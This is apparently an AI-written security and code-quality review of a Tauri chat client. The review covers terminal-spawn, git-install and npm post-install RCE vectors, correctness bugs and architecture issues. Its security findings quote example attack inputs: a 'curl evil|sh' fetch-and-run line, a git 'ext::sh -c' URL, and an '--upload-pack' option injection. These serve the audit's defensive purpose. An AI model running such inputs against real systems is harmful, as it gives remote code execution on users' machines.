# rim-ui — Review Findings

**Reviewer:** Claude Fable 5
**Date:** 2026-07-08
**Scope:** Architecture, security, and implementation quality of `rim-ui` — the Tauri 2 desktop (and web) client (~50k LOC TS/TSX + ~9k LOC Rust in `src-tauri`).
**Method:** Static analysis + targeted tracing of the plugin host, Tauri command surface, auth/CSP, and every `src/features/*` subsystem. `tsc` passes clean. `npm audit` was consulted for dependency advisories.

> **Note:** this review is complete — security, per-feature correctness, and the app-level cross-cutting architecture pass (see the **Cross-cutting architecture** section).

---

## Overall assessment

The security-sensitive core is, for the most part, thoughtfully built. The **plugin capability broker is real enforcement, not advisory**: the gate is checked before every RPC dispatch (default-deny, unknown methods denied), seeded from persisted approvals, per-capability rate-limited, panel ownership is verified, and the handshake validates protocol version and echoed `plugin_id`. Auth is done right — session lives in an HttpOnly cookie with double-submit CSRF, `userId`-only in Zustand, and **no tokens in localStorage** (the CLAUDE.md rule holds). AI-provider keys have been migrated to the OS keyring (Rust-side), wrapped in `Zeroizing`, never logged. Markdown rendering is DOMPurify-sanitized with a tag/attr allowlist, and the Tauri CSP is genuinely tight (`script-src 'self'`, no `unsafe-eval`).

The problems are concentrated and serious where they exist:

1. **Three RCE-class desktop vectors** that sidestep the capability model entirely — an unguarded terminal-spawn command exposed to the whole renderer, `git clone` with an unvalidated URL (`ext::` transport injection), and `npm/pip install` running attacker post-install scripts *before* any trust prompt.
2. **A cluster of confirmed correctness bugs** in the feature editors and cache layer — reordering macro steps corrupts data, editing a user command wipes its steps, several mutations never invalidate their list queries, and a progressive-disclosure gate is permanently closed.
3. **Pervasive `key={index}` on editable/reorderable lists**, plus heavy copy-paste across the settings surfaces.
4. **The message hot path** — the core chat timeline is not virtualized *and* its per-item `memo` is defeated by unstable callbacks, so render cost grows unbounded with history and every keystroke/scroll re-renders every mounted message. This is the single highest-leverage architectural fix (see C-H1/C-H2).

### The plugin trust model — read this first
Plugins run as **ordinary native child processes** (`PluginProcess::spawn`, `process.rs:49`) with the host's inherited environment and full user privileges: direct filesystem, network, and syscall access. The `CapabilityGate` only governs **host-brokered RPC** (chat/events/panels over stdio); it does **not** contain what a plugin does through its own Node/Python runtime. This is acknowledged in the docs (`local_plugin_host.md`: "Manifest capabilities are not, by themselves, a complete OS sandbox") and matches the "dangerous local execution" framing in the capability model, so it is **not** a defect per se. But it means an *installed & enabled* plugin is already game-over, so the findings that matter most are the ones that let untrusted code reach that state **without informed consent** (H1–H3 below), or let the renderer/web surface reach powerful IPC.

---

## Security findings

### High

**S-H1 — `terminal_create` is an unguarded arbitrary-process-execution primitive exposed to the entire renderer.** `src-tauri/src/terminal/commands.rs:7` + `session.rs:197-206` (`resolve_shell`). `resolve_shell` accepts **any** caller-supplied `shell` string and only checks `path.is_file()` — no allowlist, no `local.process` capability check, no confirmation. Any renderer JS (or any DOM/markdown XSS that reaches `invoke`) can call `invoke("terminal_create",{shell:"/bin/sh",cwd:"/"})` then `terminal_write(base64("curl evil|sh\n"))` for full RCE. This directly contradicts the capability model, which classifies `local.process` as dangerous and requiring confirmation.
*Fix:* gate `terminal_create` behind explicit user confirmation / a dangerous-capability check, and restrict `shell` to a known set (or the resolved default).

**S-H2 — `plugin_install_from_git` passes the URL to `git` with no scheme validation → command execution via `ext::`.** `src-tauri/src/plugin_host/git_install.rs:86-111` (`git_clone`), reached from `commands.rs:352` / `usePluginActions.ts:102`. The `url` is forwarded verbatim as a positional arg to `git clone`. Git's default `ext::` remote helper executes arbitrary shell: a "plugin URL" of `ext::sh -c "id>/tmp/pwned"` runs at install time — before manifest validation, capability approval, or enable. A positional value like `--upload-pack=…` is also parsed as an option (second exec vector). The dialog labels this field "GitHub URL", so a socially-engineered URL suffices.
*Fix:* allowlist the scheme (`https://`/`git://`/`ssh://`), reject `ext::`/`file://`/anything containing `::`, insert a literal `--` before the URL/dir args, and set `GIT_ALLOW_PROTOCOL=https:git:ssh` in the child env.

**S-H3 — Plugin install runs `npm install` / `pip install` (arbitrary post-install scripts) before any trust prompt.** `git_install.rs:176-215` (`run_post_install`), called from `install_from_git:267`. Installing a plugin auto-runs `npm install --production` / `pip install -r requirements.txt`, both of which execute attacker-controlled lifecycle scripts (`preinstall`/`postinstall`, `setup.py`) with full user privileges — again before the capability-approval UI is shown, and outside the manifest validation (which only inspects the manifest, not package scripts).
*Fix:* don't run package-manager installs implicitly; require explicit, clearly-worded consent naming it as arbitrary code execution, or drop auto-install and require plugins to vendor dependencies.

**S-H4 — Vulnerable dependency: `react-router-dom` 7.13.1.** `package.json:37`; used in `src/app/router/AppRouter.tsx` and the auth pages. `npm audit` reports High advisories in this range (open-redirect via protocol-relative `//` paths, XSS in redirect handling) — relevant to a routed SPA that handles auth/invite tokens.
*Fix:* `npm audit fix` / upgrade to a patched 7.x.

### Medium

**S-M1 — `get_stronghold_password` hands the Stronghold master key to the renderer.** `src-tauri/src/lib.rs:19-44`, consumed by `keyStore.ts:57-68`. The command returns the raw base64 master key to JS on request; any renderer XSS can `invoke("get_stronghold_password")`, open `rim-secrets.hold`, and decrypt every entry at rest. Partly inherent to `tauri-plugin-stronghold` (its JS plugin runs in the webview), and provider keys have already moved to the OS keyring (the right direction) — but while anything sensitive remains in Stronghold, its at-rest protection doesn't hold against a compromised renderer.
*Fix:* finish migrating all secrets to the Rust-side keyring so the webview never receives the master key; then remove the command.

**S-M2 — Vulnerable dependency: `dompurify` 3.3.3.** `npm audit` lists advisories; most require `IN_PLACE`/mutating hooks, which `MarkdownRenderer.tsx` doesn't use (string-in/string-out, static config), so current exploitability is low — but DOMPurify is the **sole** XSS backstop for all message HTML, so it shouldn't lag on advisories. Upgrade.

**S-M3 — Production Tauri CSP config appears unwired.** `tauri.conf.json:22` ships the dev-broad CSP (`connect-src … ws://localhost:* http://localhost:*`); `tauri.release.conf.json:5` (which narrows `connect-src` to the API host) is **not referenced** by any build script/CI/`--config` flag (grep found no wiring), and still contains `REPLACE_WITH_API_HOST` placeholders. If unwired, production desktop builds ship the dev CSP.
*Fix:* wire `tauri.release.conf.json` into the release build, substitute the API host, and confirm the effective runtime CSP in a production bundle. **(Suspected — verify against an actual release build.)**

### Low
- **S-L1 — Markdown link renderer injects unescaped `href`.** `MarkdownRenderer.tsx:8-10` interpolates `href` into `<a href="${href}">` without escaping. Currently safe because `DOMPurify.sanitize` runs last and strips `javascript:` — but that makes sanitization the *only* layer. Escape `href` with the existing `escapeAttr` helper so it's defense-in-depth.
- **S-L2 — No meta CSP fallback in `index.html`.** The web build's CSP comes only from the nginx `add_header` (`Dockerfile:68`, solid). If the SPA is ever served by another host without that header, there's no CSP. Add a baseline `<meta http-equiv="Content-Security-Policy">`.
- **S-L3 — `rim-plugin://` serves panel assets for disabled/uninstalled-but-not-purged plugins.** `lib.rs:56-111`. Path-traversal is correctly handled (segment checks + canonicalize + `starts_with` root — well done), but there's no enabled-state check. Low impact (own assets only). Check enabled state before serving, or purge dirs on uninstall.

### Informational / verified clean
- Capability enforcement is real (`broker.rs:114` checks before dispatch; `lifecycle.rs:195` rejects capabilities not in the manifest; `commands.rs:616-629` re-checks AI-command consent server-side; per-capability rate limiting present).
- Auth/session correct: HttpOnly session cookie, `credentials:"include"`, double-submit CSRF from the non-HttpOnly `rim_csrf` cookie into `x-csrf-token` (`client.ts:15-27`); `useAuthStore` holds only `userId`; no token in localStorage/sessionStorage anywhere.
- `agent_proxy` key handling is correct: keys in the OS keyring, `Zeroizing`, never logged, `deny_unknown_fields`, LLM traffic proxied Rust-side so the webview CSP can forbid provider origins.
- Plugin-panel iframes: `postMessage` inbound validated by `event.origin === "null"` **and** `event.source === iframe.contentWindow` (the important check); panels sandboxed with `default-src 'none'` so `unsafe-inline` script can't reach the network. Containment is good.
- No updater configured — nothing to misconfigure.

---

## Feature correctness & quality findings

### High

**F-H1 — Reordering macro steps silently corrupts each step's `args`.** `features/macros/components/MacroSettings.tsx:154-173`. The step list uses `key={index}` while `moveStep` reorders, and the args field is **uncontrolled** (`defaultValue={JSON.stringify(step.args)}`, `onBlur` only). On reorder React keeps the DOM node per index, so `commandId` (controlled) moves but `args` does not — wrong args displayed and saved.
*Fix:* stable per-step id key, or make the args input controlled.

**F-H2 — Editing a user command wipes its steps.** `features/commands/.../UserCommandSettings.tsx:81-132`. `startEditingCommand` sets `editSteps=[]` (steps aren't in the query); `handleSaveEdit` ships `steps: editSteps.filter(...)` = `[]` on every save. Editing only the title overwrites the command's real steps with empty.
*Fix:* fetch existing steps before editing, or omit `steps` when untouched.

**F-H3 — `DisclosureGate` is permanently closed; progressive disclosure never activates.** `features/disclosure/state/useDisclosureStore.ts:31` sets `isLoaded:false`; the only thing that flips it true (`setProfile`) has **zero callers**. `DisclosureGate.tsx:22` returns null while `!isLoaded`, so it always renders nothing — its consumer `StatusBar.tsx:101` (`minTier=INTERMEDIATE`) never shows children. Dead UI.
*Fix:* hydrate the store from `mySkillProfile` on app start, or gate directly off the TanStack Query result.

### Medium

- **F-M1 — Agent submit swallows errors → silent no-op.** `features/agent/components/AgentOverlay.tsx:182-207`. The `void (async()=>{})()` in `handleSubmit` runs the keyring check + provider/tool registration with no try/catch; any failure before `runAgent` (IPC error, dynamic-import, tool fetch) becomes an unhandled rejection, and since `reset()` already set status idle, the user sees the input re-enabled with **no error and no response**. Wrap in try/catch → `setStatus("error")` + append text.
- **F-M2 — Agent context window not re-trimmed inside the tool loop.** `features/agent/runtime/agentEngine.ts:125`. `trimToContextWindow` runs once before the `while`; each of up to `MAX_TOOL_ROUNDS=10` rounds pushes a tool_use + a (potentially large raw) tool_result, so the array can blow past the model window mid-loop → provider 400 as a generic error. Re-trim at the top of each iteration.
- **F-M3 — Agent disclaimer is bypassable.** `AgentOverlay.tsx:106-119,152-155`. `disclaimerChecked` is a one-shot local flag; `handleDisclaimerCancel` closes the overlay but leaves it true, so reopening skips the gate. Reset on cancel or gate on `isDisclaimerAccepted()` directly.
- **F-M4 — Macros update/delete never invalidate the list.** `features/macros/api/useMacros.ts:111-114,122-124` invalidate `["macros", undefined]` but the live key is `["macros", serverId]` — the partial match hits nothing, so the list stays stale until the 30s staleTime (create does it right). Pass `serverId` or use the bare `["macros"]` prefix.
- **F-M5 — Incident mutations never invalidate `listIncidents`.** `features/incidents/api/useIncident.ts:203/225/318` invalidate only `activeIncident`/`incidentTimeline`; `IncidentHistoryPage` shows stale status and misses new incidents. Add `invalidateQueries({queryKey:["listIncidents"]})`.
- **F-M6 — Dangerous-macro confirmation is bypassable.** `MacroSettings.tsx:296-302` builds the danger set from `useCommands("PALETTE")`; a dangerous command with `visibleInPalette:false` is absent → runs with no prompt. Use a full-catalog surface or let the backend own the check.
- **F-M7 — Global fallback keybinds hijack native text nav and dispatch no-ops.** `features/commands/.../KeybindProvider.tsx:164-193`. `Ctrl+Arrow`/`Ctrl+L` exist only in `FALLBACK_KEYBINDS` with no `localHandler`; being GLOBAL they match inside text inputs (the `isTextInput` guard only runs on no-match), so word-nav is `preventDefault`'d and a "No local handler" no-op fires. Implement the handlers or remove the fallbacks.
- **F-M8 — Terminal teardown race leaks xterm + all listeners.** `features/terminal/.../useTerminalSession.ts:96-234`. `setup()` assigns `cleanupRef.current` only at the end; unmount before it resolves (StrictMode / fast tab switch) runs cleanup while the ref is null → Terminal, 2 `listen()` subs, ResizeObserver, and store sub all leak. Bail + dispose after each await.
- **F-M9 — Query-error states missing.** `PipelineSettings.tsx:419/485` and `emoji/api/useCustomEmojis.ts:27` (used at `EmojiManagement.tsx:209`) don't surface `isError` — on failure they render "No X yet." Pull `isError` and render a retry state (as the incident/audit pages do).
- **F-M10 — `key={index}` on editable/reorderable rows** beyond F-H1: `LensEditor.tsx:182`, `PipelineSettings.tsx:269` (conditions) & `:345` (actions, where each row embeds a `CommandIdInput` whose autocomplete state then binds to the wrong row after a delete). Give drafts stable ids and key on those. *(Note: `key={index}` at `UserCommandSettings:195/316`, `AiMacroBuilder:142`, `CommandPalette:308` are **not** bugs — those lists are fully controlled or append/read-only.)*
- **F-M11 — Hand-written GraphQL types duplicate generated ones** (violates the CLAUDE.md codegen rule): `CustomEmoji` (`useCustomEmojis.ts:5-12` vs generated `schema-types.ts:531`), `ProfileUser` (`useUpdateProfile.ts:21` vs generated `User`). Import/`Pick` the generated types. Emoji GraphQL docs also bypass the `gql` tag + fragment convention (`useCustomEmojis.ts:14`, `EmojiManagement.tsx:12,25`).
- **F-M12 — Divergent plugin-exec paths.** `commandDispatcher.ts:319-345` uses raw `invoke` + `status==="ok"`; `usePluginExecuteCommand.ts` uses `safeInvoke` + structured errors. The dispatcher loses error detail. Consolidate on `safeInvoke`.
- **F-M13 — CommandPalette is not accessible.** `CommandPalette.tsx:289-397` is a plain div (no `role=dialog`/`aria-modal`), no focus trap, unlabeled input, no `listbox`/`option`/`aria-activedescendant` — on the flagship keyboard-first surface. Add ARIA roles + focus management.
- **F-M14 — God components + heavy duplication.** `WorkspaceStateSettings.tsx` (592 lines) and `PipelineSettings.tsx` (562 lines) each bundle a full editor + list; the step-editor is reimplemented twice inside `UserCommandSettings` alone and again in `MacroSettings`; `IncidentHistoryPage`/`AuditLogPage` share byte-identical `FilterChip`/skeleton/pagination. A shared `<StepListEditor>` / `<KeystrokeCapture>` and extracted list-page primitives would remove ~300+ lines and would have prevented F-H1/F-H2.

### Low
- **F-L1 — Hardcoded colors violate the design-token rule** (`text-white`/`bg-white*`): `MacroSettings:211,353`, `AiMacroBuilder:194,203`, `KeybindSettings:663`, `PluginAiConsentPanel:276`, `TrustBadge:7`, `PluginSlotContainer:26`, `PluginToolPanel:75`, `PluginCapabilityPrompt:86`, `PluginSettingsPage:362`.
- **F-L2 — Dead code from the Stronghold→keyring migration:** `makeKeyLoader`/`loadApiKey` thunk (`AgentOverlay.tsx:40`) is bound to `_loadKey` and never called (keys read Rust-side); `keyStore.withKey`/`saveApiKey` have no non-test callers; `ValidationOutcome` defined twice (`providers/types.ts:61` vs `AgentSettingsPanel.tsx:144`); `disclosure/api/useSkillProfile.ts` has zero importers; `requiresConfirmation` plumbed through generator/registry but consumed nowhere (confirmation is server-driven). Delete.
- **F-L3 — Subscription/listener races** (assign-`unlisten`-after-await): `features/plugins/runtime/pluginEventBus.ts:26-56` — mirror the guarded-cancel pattern already correct in `PluginAiConsentPanel.tsx:378-400`.
- **F-L4 — Emoji preview object URL never revoked** (`EmojiManagement.tsx:101` `createObjectURL` with no `revokeObjectURL`) — leak.
- **F-L5 — a11y gaps:** `WorkspaceStateSettings.tsx:298` expand row is a `div onClick` with no role/tabIndex/key handler (unlike `IncidentRow`, which does it right); hand-rolled focus traps duplicated in `AgentOverlay`/`ConfirmCommandModal` while a shared `Dialog` exists.
- **F-L6 — Perf micro-nits:** `KeybindProvider` rebuilds `mergeWithFallbacks(keybinds)` inside the keydown handler on every press (`:238`) — memoize; `AuditLogPage.tsx:47` switch over `AuditOutcomeGql` has no default branch → `undefined` class on any new enum value.
- **F-L7 — Test-coverage gaps:** no loop-level agent-engine tests (abort/signal, parallel-cap skip, `MAX_TOOL_ROUNDS`, mutating-cap through `turnBudget.reserve`); macros has only `useMacros.test.ts` (no `parseMacroResponse`, no component tests); **lenses, pipelines, and disclosure have zero tests** — exactly where the `key={index}` editor logic (F-M10) and the dead-gate bug (F-H3) live. Tests here would have caught F-H1/F-H2.
- **F-L8 — Unreachable conversation history:** `useAgentStore` persists up to 20 conversations, but `AgentOverlay` renders only the active one with no history switcher and `open()` starts fresh on done/error — the stored conversations are dead surface.

---

## Cross-cutting architecture

App-level structure only (per-feature bugs are above). `tsc --noEmit` passes clean — a strong baseline.

### High

**C-H1 — The message list is NOT virtualized.** `@tanstack/react-virtual` is a declared dependency with **zero usages** in non-test source. `features/messages/.../MessageTimeline.tsx:480` renders `items.map(...)` over the full flattened, infinitely-growing page set — directly contradicting AGENTS.md ("long unbounded lists… designed with virtualization in mind"). Render cost grows unbounded with history.
*Fix:* wrap the list in `useVirtualizer` (the scroll container + refs already exist).

**C-H2 — `MessageItem`'s `memo` is defeated by unstable props.** `MessageItem` is correctly `memo`'d (`MessageItem.tsx:118`) but `MessageTimeline` passes plain (non-`useCallback`) functions recreated every render: `onToggleReaction` (`:391`), `onSaveEdit` (`:372`), `onCancelEdit` (`:387`), `onContextMenu` (`:359`). So every parent render re-renders **all** `MessageItem`s — combined with C-H1, any scroll/typing/selection change re-renders the entire timeline. (`memberLookup.resolve`/`memberDisplayMap` *are* stable — good.)
*Fix:* wrap those four handlers in `useCallback`.

**C-H3 — `WorkspaceShell` is a god-component.** `shell/layouts/AppShell.tsx:111-325` calls ~15 orchestration hooks, reads ~16 store slices, and renders every overlay plus both plugin slots in one function — so any store-slice change re-renders the whole shell tree. Hardest component to test, highest merge-conflict surface.
*Fix:* extract a side-effect-only `<ShellSubscriptions/>` (the 15 hooks, returns null) and a `<ShellOverlays/>`; keep `WorkspaceShell` as pure layout. *(Prop drilling is correctly avoided — surfaces read Zustand directly. Preserve that.)*

### Medium

**C-M1 — Terminal is the least-gated powerful surface, and web can reach it.** The terminal (local process execution) is **not represented in `RuntimeCapabilities`** at all — `runtime.ts:12` has `localProcess` but nothing consumes it. Gating relies solely on the persisted `useTerminalStore.enabled` flag. `SettingsPage.tsx:245-260` renders a static, unfiltered tab list, `TerminalSettings` has no capability guard, so a **web** user can toggle `enabled:true` and `TerminalPaneSlot` (`AppShell.tsx:328-338`) mounts `<TerminalPane>` whose Tauri `invoke`s then fail at runtime rather than being gated. (Pairs with security finding S-H1.)
*Fix:* add `terminal`/reuse `localProcess` in the capability table, gate `TerminalSettings` + `TerminalPaneSlot` on it, and filter the settings tabs by capability (also hides the cosmetically-leaking Plugins/Agent tabs on web).

**C-M2 — Server state mirrored into Zustand (unread counts) → dual source of truth.** `features/conversations/api/useUnreadCounts.ts:38-42` writes server data into a Zustand store from inside the `queryFn`, while live increments (`useUnreadStore.ts:18`) only mutate Zustand. The TanStack cache entry and `useUnreadStore.counts` can diverge, and `refetchOnWindowFocus:true` overwrites locally-incremented counts on focus.
*Fix:* pick one owner — read counts via `useQuery`'s `select` and patch the query cache on WS events (drop the store), or make the store the sole owner and the query a thin loader. (Watermarks in the same store are legitimately client-local — fine.)

**C-M3 — `MessageItem` is a 45-prop, 938-line component** (`MessageItem.tsx`). The prop explosion is what forces the unstable-callback problem in C-H2 and makes memoization brittle.
*Fix:* pass a small `useMemo`-stable `handlers` object and a `MessageViewModel` rather than 45 scalars.

**C-M4 — Codegen is deliberately un-validating, so hand-written response types drift.** `codegen.mjs:20-38` runs the `typescript` plugin only (schema types), explicitly skipping document scanning "to avoid validation errors from stale/mismatched frontend queries." Result: **32 hand-written `*Response` interfaces across 20 files** (e.g. `useMessages.ts`) that can silently diverge from the actual `gql` selection — exactly the "silent query failure" CLAUDE.md warns about, with codegen configured *not* to catch it. `typescript-operations` / `typescript-graphql-request` are in devDependencies but unused.
*Fix:* add `typescript-operations` with `documents` scanning (or `client-preset`) so operation result types are generated and mismatches fail the build.

### Low
- **C-L1 — `ReactionsUpdated` relies on a refetch that never happens.** `core/events/useWorkspaceEvents.ts:266-269` invalidates with `refetchType:"none"` expecting a focus refresh, but the global default is `refetchOnWindowFocus:false` (`queryClient.ts:6`) — so `reactedByMe` staleness is never reconciled. Patch `reactedByMe` from the event, or refetch explicitly.
- **C-L2 — Zen-mode wrapper duplication.** `AppShell.tsx:173-320` repeats the same transition-opacity wrapper ~9×. Extract a `<ZenFade hidden axis>` component.
- **C-L3 — Thin fragment reuse.** Only 2 fragments (`message.ts` used 8×, `conversation.ts` 3×) against 67 gql operations in 53 files; most selections are inline, making over/under-fetching hard to audit. Extend the `MESSAGE_FIELDS` pattern to incidents/lenses/pipelines.
- **C-L4 — No linter/formatter** (ESLint/Prettier/Biome/EditorConfig). Currently masked by unusually disciplined code + clean `tsc`, but nothing enforces exhaustive-deps (several manual disables exist), import ordering, or the no-`any` convention for future contributors. Also 7 `eslint-disable` comments are **inert** (no ESLint present) — dead noise.
- **C-L5 — Stale docs.** CLAUDE.md still lists `generated/sdk.ts` as "DEAD CODE, pending removal" — the file no longer exists (already removed). No other obviously-dead modules found.

### What's strong here (verified)
- **TypeScript hygiene is exemplary:** `as any` = 0, `@ts-ignore` = 0, a single justified `@ts-expect-error`, no `: any` in real code; ~91 non-null `!` but overwhelmingly the safe `workspaceId!`-after-`enabled`-guard pattern.
- **`wsClient.ts`** is production-grade: infinite interruptible backoff, keepalive/pong dead-connection detection, URL resolved per reconnect.
- **WS→TanStack cache patching is thoughtful and correct:** `useWorkspaceEvents.ts` distinguishes direct `setQueryData` patches (new/edit/delete/pin/reactions) from invalidation (threads/members/conversations); the `NewMessage` append to `pages[0]` tail is correct given the timeline reverses pages.
- **Centralized runtime-capability model** (`getRuntimeCapabilities(platform)`), with plugins/agent gated in depth via `enabled: capabilities.*` and early-returns.
- **Design-system discipline:** zero duplicated avatar rendering (5 components use shared `Avatar`), zero hardcoded Tailwind palette colors, only 9 raw hex literals (mostly the incident tag color).

---

## What's done well (worth preserving)
- Plugin capability broker: genuine default-deny enforcement before every dispatch, manifest-bounded approvals, per-capability rate limiting, panel-ownership checks, validated handshake.
- Auth/secret hygiene: HttpOnly session cookie + double-submit CSRF, no tokens in web storage, provider keys in the OS keyring with `Zeroizing` and Rust-side LLM proxying.
- XSS defense: DOMPurify allowlist on all rendered message HTML; tight Tauri CSP (`script-src 'self'`, no `unsafe-eval`); correctly-sandboxed plugin panels with `event.source` validation.
- State discipline in the agent feature is correct (no server state in Zustand, ephemeral fields excluded from `partialize`, superseded confirmation promises settled as rejected).
- Solid patterns exist to copy from: `AuditLogPage`/`IncidentHistoryPage` cursor-stack pagination with skeleton/empty/error states, `usePipelines`' `PIPELINE_FIELDS` fragment, `useListIncidents`' normalized query key, `argsMasker` mirroring the backend redaction policy with tests. TypeScript quality is high overall and generated types are used throughout most features.

---

## Suggested remediation order
1. **S-H1 / S-H2 / S-H3** — the three RCE-class vectors (terminal, git `ext::`, post-install scripts). Highest priority.
2. **S-H4 / S-M2** — dependency bumps (react-router-dom, dompurify) via `npm audit fix`.
3. **F-H1 / F-H2 / F-H3** — data-corrupting / dead-feature correctness bugs.
4. **S-M1 / S-M3** — finish the keyring migration; verify the production CSP is wired.
5. **C-H1 / C-H2** — virtualize the message list and `useCallback` the four timeline handlers. Biggest structural/perf win; do together.
6. **C-M1** — close the terminal gating hole (pairs with S-H1).
7. **F-M4 / F-M5** and the other cache-invalidation bugs (cheap, user-visible staleness).
8. The duplication + `key={index}` cleanups (F-M10/F-M14) and the codegen validation gap (C-M4) — each removes a whole bug class.
